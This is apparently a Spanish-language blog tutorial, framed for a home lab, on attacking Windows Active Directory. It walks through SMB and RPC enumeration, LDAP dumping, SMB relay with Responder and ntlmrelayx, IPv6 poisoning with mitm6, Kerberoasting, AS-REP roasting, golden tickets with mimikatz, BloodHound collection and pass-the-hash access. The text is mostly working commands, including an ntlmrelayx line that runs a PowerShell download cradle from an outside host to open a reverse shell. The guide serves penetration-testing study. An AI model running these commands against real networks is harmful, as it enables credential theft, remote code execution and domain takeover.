I"µ<<h2 id="este-art√≠culo-engloba-una-enorme-y-extensa-gu√≠a-de-ataques-que-se-pueden-realizar-en-un-entorno-de-directorio-activo"><strong>Este art√≠culo engloba una enorme y extensa gu√≠a de ataques que se pueden realizar en un entorno de Directorio Activo</strong></h2>
<p>Para practicar todo este tipo de ataques te recomiendo que te montes un laboratorio para puedas poner en practica todo lo que se va a tocar en la gu√≠a, por lo tanto los sistemas que vas a necesitar son:</p>

<ul>
  <li>Windows Server 2016</li>
  <li>Windows 10
<br /></li>
</ul>

<h2 id="enumerar-usuarios-del-sistema">Enumerar usuarios del sistema</h2>

<p>Considero que mostrar en la gu√≠a instalar los sistemas operativos e implementar los equipos al dominio creo que no es necesario. En el caso que no sepais os lo dejo en vuestras manos ya que tambi√©n hay que aprender a investigar y eso lo debes de aprender por tu cuenta</p>

<h3 id="smbclient-y-smbmap">SMBCLIENT Y SMBMAP</h3>

<p>Con estas herramienta podemos listar recursos compartidos a nivel de red a trav√©s del protocolo samba para poder enumerar este servicio debe de estar el puerto abierto el cual podemos escanear de varias formas</p>

<p><strong>Listar recuros compartidos sin conocer credenciales</strong></p>

<pre><code class="language-bash">smbclient -L 192.168.213.136 -N
</code></pre>
<p>En el caso de que no salgan recursos es necesario requerir de credenciales o si es otro tipo de error en el samba deberemos de especificar el siguiente par√°metro</p>
<pre><code class="language-bash">smbclient -L 192.168.213.136 -N --option='client min protocol=NT1'
</code></pre>

<p>Entrar en modo interactivo para ver el contenido de una carpeta compartida con smbclient</p>
<pre><code class="language-bash">smbclient //192.168.213.136/ShareFolder -N 
</code></pre>

<p>Ver el contenido de una carpeta compartida con smbclient utilizando contrase√±a</p>
<pre><code class="language-bash">smbclient //192.168.213.136/ShareFolder -U "admin%password123"
</code></pre>

<p>Para leer archivos compartidos del sistema tambi√©n podemos utilizar <strong>smbmap</strong> con la que a dem√°s podemos ver los permisos</p>
<pre><code class="language-bash">smbmap -H 192.168.213.136 -u 'null'
</code></pre>

<p>Ver el contenido de una carpeta con smbmap</p>
<pre><code class="language-bash">smbmap -H 192.168.213.136 -r 'ShareFolder'
</code></pre>

<p>Ver los recursos compartidos con smbmap utilando contrase√±a</p>
<pre><code class="language-bash">smbmap -H 192.168.213.136 -u 'admin' -p 'password123'
</code></pre>
<h3 id="rpcclient">RPCCLIENT</h3>

<p>Con esta herramienta vas a poder informaci√≥n de una m√°quina como por ejemplo usuarios del sistema, grupos‚Ä¶</p>

<p>Para poder conectarte y poder enumerar debemos de ejecutar la siguiente sentencia:</p>
<pre><code class="language-bash">rpcclient -U "" 192.168.213.135 ‚û°Ô∏è  Sin contrase√±a
rpcclient -U "alejandrocorp.local\alejandro%Password1" ‚û°Ô∏è  Con contrase√±a
</code></pre>

<p>Si queremos enumerar los usuarios del dominio podemos realizarlo con esta sentencia en una misma l√≠nea:
<img src="/assets/images/Active-Directory/rpc.png" /></p>

<p>Cada usuario tiene un rid a trav√©s del cual podemos saber en que grupos se encuentra y mas informaci√≥n al respecto:
<img src="/assets/images/Active-Directory/enumusers.png" /></p>

<p>Ejecutando la siguiente sentencia veremos informaci√≥n acerca del usuario que escogimos a trav√©s del rid</p>

<p><img src="/assets/images/Active-Directory/queryuser.png" /></p>

<p>Sentencia para enumerar informaci√≥n completa de usuarios en una sola linea</p>
<pre><code class="language-bash">for rid in $(rpcclient -U "s4vicorp.local\alejandro%Password1" 192.168.213.135 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' |tr -d '[]'); do echo "\n[+] para el RID: $rid\n"; rpcclient -U "s4vicorp.local\alejandro%Password1" 192.168.213.135 -c "queryuser $rid" |grep -E -i "user name|description" ; done
</code></pre>

<p>Podemos ver los grupos que se encuentran a nivel de dominio</p>

<p><img src="/assets/images/Active-Directory/grupos.png" /></p>

<p>Dentro de esos grupos se encuentran los rid de los usuarios los cuales podemos enumerar con el siguiente comando:</p>

<p><img src="/assets/images/Active-Directory/usersgrupos.png" /></p>

<h3 id="ldapdomaindump">LDAPDOMAINDUMP</h3>

<p>Si no quereis hacer lo que hemos hecho con rpcclient podemos utilizar esta herramienta que nos automatiza el proceso de enumerar la cual v√≠a web te representa toda la informaci√≥n estructurada</p>

<p>Esta herramienta es de github ‚û°Ô∏è  : <a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a></p>

<p>Nos la clonamos el repositorio y nos vamos a la ruta /var/www/html, en donde iniciamos el servicio apache2 y despu√©s ejecutamos el siguiente comando y abrimos el navegador y ponemos <strong>localhost</strong></p>

<pre><code class="language-bash">python3 /opt/ldapdomaindump/ldapdomaindump.py -u 's4vicorp.local\alejandro' -p 'Password1' 192.168.213.135
</code></pre>

<h2 id="ataques-directorio-activo">ATAQUES DIRECTORIO ACTIVO</h2>

<h3 id="smb-relay">SMB RELAY</h3>

<p>‚ö†Ô∏è  Este ataque solo funciona si los equipos de la red no utilizan samba firmando, que os aseguro que la mayor√≠a de empresas no lo tienen</p>

<p>Este ataque consiste en envenenar tr√°fico, y como no esta firmado no se logra validar la legitimidad del origen nos enviar√° su hash NTLMV2 ya que se autentica contra nostros</p>

<p><code>IPV4</code></p>

<p>Bueno para poder envenenar el tr√°fico por IPV4 es necesario de prescindir del Responder.py en la mayor√≠a de sistemas de pentesting aparece instalado en la ruta ‚Äú/usr/share/Responder‚Äù</p>

<pre><code class="language-bash">python3 responder.py -I eth0 -wv
</code></pre>

<p>Una vez ejecutado el comando ya est√° envenando en el momento que algui√©n busque un recurso compartido que no exista tendremos el hash NTLMv2</p>

<p><img src="/assets/images/Active-Directory/responder.png" /></p>

<p>Copiamos ese hash NTLMv2 y vamos a crackear el hash con john, si la contrase√±a es lo suficientemente poco segura la podremos sacar. Una vez sacada la deberemos de validar con la herramienta <code>crackmapexec</code></p>

<p><img src="/assets/images/Active-Directory/hash.png" /></p>

<p>Si nos pone un <strong><code>(Pwned!)</code></strong> podremos ejecutar comandos en la m√°quina porque la contrase√±a es privilegiada. En ese caso podemos realizar otro ataque de envenenamiento por el que vamos a poder dumpear la sam del equipo o ejecutar cualquier otro comando.</p>

<p>Vamos a volver a envenenar el tr√°fico, pero esta vez vamos a <strong>editar el Responder.conf para poner [SMB=Off, HTTP=Off]</strong>, despu√©s ejecutamos la siguiente herramienta con los siguientes par√°metros</p>

<p><img src="/assets/images/Active-Directory/ntlmrelayx.png" /></p>

<p>En el momento en el que se autentique va a ejecutar ese mismo comando aprovechandose de ese autenticaci√≥n y nos dumpea la sam. Tambi√©n podemos especificar comandos a ejecutar con el siguiente comando:</p>

<p>Por ejemplo ejecutarse un archivo de powershell que te entable una reverse_shell</p>

<pre><code class="language-bash">ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/PS.ps1')"
</code></pre>

<p><code>IPV6</code></p>

<p>Para poder envenenar el tr√°fico por IPV6 deberemos de utilizar la herramienta <code>mitm6</code> para a trav√©s de ella envenenar el DNS, la puerta de enlace y dem√°s para que posteriormente en el momento que busquen un recurso compartido que no exista y el hash del usuario es privilegiado podremos ejecutar comandos</p>

<p>Envenenamos la red:</p>

<pre><code class="language-bash">mitm6 -d &lt;dominio&gt;
</code></pre>
<p>Ahora para que nos pille esa comunicaci√≥n entraremos en modo interactivo y utilizando socks para posteriormente si es privilegiado ejecutar comandos a trav√©s de proxychains</p>

<pre><code class="language-bash">ntlmrelayx.py -6 -wh kali-IP -t smb://192.168.94.138 -socks -debug -smb2support
</code></pre>

<p>En el modo interactivo podemos limpiar la pantalla con ‚ÄúCTRL + L‚Äù. Para poder ver los usuarios que intercept√≥ debemos de ejecutar el comando <code>socks</code></p>

<p><img src="/assets/images/Active-Directory/ipv6.png" /></p>

<p>Vemos que pone <strong>TRUE</strong> por lo tanto podemos configurar proxychains para redirigir esa autenticaci√≥n que al ser privilegiada podamos ejecutar comandos. Para configurar proxychains nos vamos a editar el fichero <code>/etc/proxychains.conf</code></p>

<p><img src="/assets/images/Active-Directory/proxy.png" /></p>

<p>Una vez editado para poder ejecutar comandos simplemente vamos a validar que la autenticaci√≥n es v√°lida para ello ejecutamos el siguiente comando:</p>

<pre><code class="language-bash">proxychains cme smb IP -u 'mvazquez' -p 'nonecesitassaberla' -d 's4vicorp' 2&gt;/dev/null
</code></pre>

<h3 id="kerberoasting">KERBEROASTING</h3>

<p>Para este ataque se utiliza para conocer es necesario de conocer credenciales v√°lidas. Consiste en conocer usuarios que sean kerberoasteables para obtener su hash TGS y poder crackearlo</p>

<p><img src="/assets/images/Active-Directory/kerberos.png" /></p>

<p>Este ataque se puede hacer tambi√©n desde un equipo de dominio con rubeus. Si tu tienes un equipo al que tienes acceso puedes descargarte <code>rubeus.exe</code> de github un compiled-binarie, con el que lo traspasamos a la m√°quina y lo ejecutamos haciendo la siguiente sentencia:</p>

<pre><code class="language-bash">Rubeus.exe kerberoast /creduser:s4vicorp.local\alejandro /credpassword:Password1
</code></pre>

<h3 id="asreproast">ASREPROAST</h3>

<p>Para este ataque no se requiere de que conozcas las contrase√±as pero necesitas tener un listado de usuarios v√°lidos y funciona cuando un usuario a nivel de configuraci√≥n tiene asignado <code>No pedir autenticaci√≥n de kerberos previa</code>. Simplemente tienes que ejecutar el siguiente comando</p>

<p><img src="/assets/images/Active-Directory/asep.png" /></p>

<p>Como vemos obtenemos de nuevo el TGS que con el podemos crackear la contrase√±a con john</p>

<p>Este ataque se puede hacer tambi√©n desde un equipo de dominio con rubeus. Si tu tienes un equipo al que tienes acceso puedes descargarte <code>rubeus.exe</code> de github un compiled-binarie, con el que lo transferimos a la m√°quina que tengamos acceso y lo ejecutamos</p>

<pre><code class="language-bash">Rubeus.exe asreproast /user:SVC_SQLservice /domain:s4vicorp.local /dc:DC-Company
</code></pre>

<h3 id="goldenticket-attack">GOLDENTICKET ATTACK</h3>

<p>Este ataque es util para escalar privilegios haciendo un pass the ticket obteniendo informaci√≥n del usuario krbtgt contruyendo un goldenticket. Lo primero que debemos de hacer es tener acceso a un equipo para subirle el <code>mimikatz.exe</code>.</p>

<p>Una vez que hemos subido el mimikatz vamos a ejecutarlo aplicando el siguiente comando que nos dar√° informaci√≥n del usuario krbtgt</p>

<p><img src="/assets/images/Active-Directory/mimikatz.png" /></p>

<p>Toda la informaci√≥n que nos arroja la copiamos para guardarla ya que nos vamos a construir un golden ticket. Una vez copiada volvemos al mimikatz de la m√°quina y ponemos el siguiente comando rellenando los siguientes datos que se guardaron en lo que nos copiamos antes</p>

<pre><code class="language-bash">kerberos::golden /domain:s4vicorp.local /sid:&lt;SID&gt; /rc4:&lt;NTLM&gt; /user:Administrador /ticket:golden.kirbi
</code></pre>

<p><img src="/assets/images/Active-Directory/mimikatz2.png" /></p>

<p>Genial como vemos se nos guard√≥ un golden.kirbi, ahora nos podemos conectar con otro usuario en otro equipo si es privilegiado y desde <code>mimikatz</code> le podemos importar ese golden.kirbi para que pueda leer recursos compartidos privilegiados a nivel de red</p>

<pre><code class="language-bash">kerberos::ptt golden.kirbi
</code></pre>

<p>Una vez hecho eso si por ejemplo intentamos listar el contenido privilegiado del DC, podremos verlo (‚Äúdir \DC-Company\c$‚Äù o dir ‚Äú\DC-Company\admin$‚Äù)</p>

<p>Pero esto apenas es nada tambi√©n podr√≠amos jugar con la herramienta <code>ticketer.py</code> de nuestro equipo local con la que podemos generar un goldenticket y poder hacer pass the hash para poder conectarnos sin contrase√±a.</p>

<p>Simplemente desde nuestro equipo ejecutamos el siguiente comando con los datos que recopilamos anteriormente con <strong>mimikat</strong>:</p>

<p><img src="/assets/images/Active-Directory/ticketer.png" /></p>

<p>Ahora se nos habr√° creado un archivo llamado ‚ÄúAdministrador.ccache‚Äù y el siguiente paso ser√° exportar una variable de entorno para que lo utilice ese archivo y poder conectarnos sin contrase√±a</p>

<pre><code class="language-bash">export KRB5CCNAME="/home/alejandro/Escritorio/Laboratorio/AD/Administrador.ccache"
</code></pre>

<p>Una vez exportada simplemente para conectarnos al DC como administrador podemos ejecutar el siguiente comando sin contrase√±a</p>

<p><img src="/assets/images/Active-Directory/golden.png" /></p>

<h2 id="bloodhound">BLOODHOUND</h2>

<p>Bueno esta herramienta es una locura que todo pentester debe de utilizar en una auditor√≠a ya que sirve para enumerar v√≠as potenciales de como conseguir ser Administrador.</p>

<p>Para poder instalarla:</p>

<pre><code class="language-bash">sudo apt install neo4j bloodhound -y
</code></pre>

<p>Tendreis que configurarlo antes el bloodhound para poder acceder con usuario y contrase√±a. Para poder iniciarlo primero ejecutamos <code>neo4j console</code> y luego abrimos el <code>bloodhound</code></p>

<p>Una vez que hayais accedido ya al bloodhound seteando la contrase√±a vamos a utilizar un script en powershell <code>SharpHound.ps1</code>, lo podemos buscar en github, el cual servir√° para que nos recoja informaci√≥n del sistema y que la almacene en un .zip</p>

<p>Una vez tengamos el script <strong>SharpHound</strong> vamos a conectarnos con una powershell hay varias formas ya sea porque teneis acceso a trav√©s de winrm o desde una cmd entablarse una powershell. Subimos el archivo:</p>

<pre><code class="language-powershell">IEX(New-Object Net.WebClient).downloadString('http://192.168.213.129/SharpHound.ps1')
</code></pre>

<p>Y luego para hacer que se ejecute el scritp ejecutamos la siguiente sentencia</p>

<pre><code class="language-powershell">Invoke-BloodHound -CollectionMethod All
</code></pre>

<p>Despu√©s de eso se nos crear√° un archivo .zip el cual lo transferiremos a nuestra m√°quina y posteriormente lo importaremos en el bloodhound.</p>

<p><strong>En el caso de que no tengamos acceso al equipo</strong> podemos ejecutar <code>bloodhound-python</code> el cual se instala:</p>

<pre><code class="language-bash">sudo apt install bloodhound-python o pip3 install bloodhound
</code></pre>

<p>Una vez tengamos la herramienta bloodhound-python podemos realizar lo mismo pero desde nuestro equipo local ejecutando el siguiente comando:</p>

<p><img src="/assets/images/Active-Directory/bloodhound.png" /></p>

<p>Se nos generan unos archivos <code>.json</code> los cuales importaremos a nuestro bloodhound para enumerar</p>

<h2 id="maneras-acceder-equipos">MANERAS ACCEDER EQUIPOS</h2>

<ul>
  <li>
    <p>Con contrase√±a ‚û°Ô∏è  <code>psexec.py s4vicorp.local/Administrador:P@\$\$w0rd\!@192.168.213.135 cmd.exe</code></p>
  </li>
  <li>
    <p>Pass the hash ‚û°Ô∏è  <code>wmiexec.py s4vicorp.local/mvazquez@192.168.213.135 -hashes hash</code></p>
  </li>
</ul>
:ET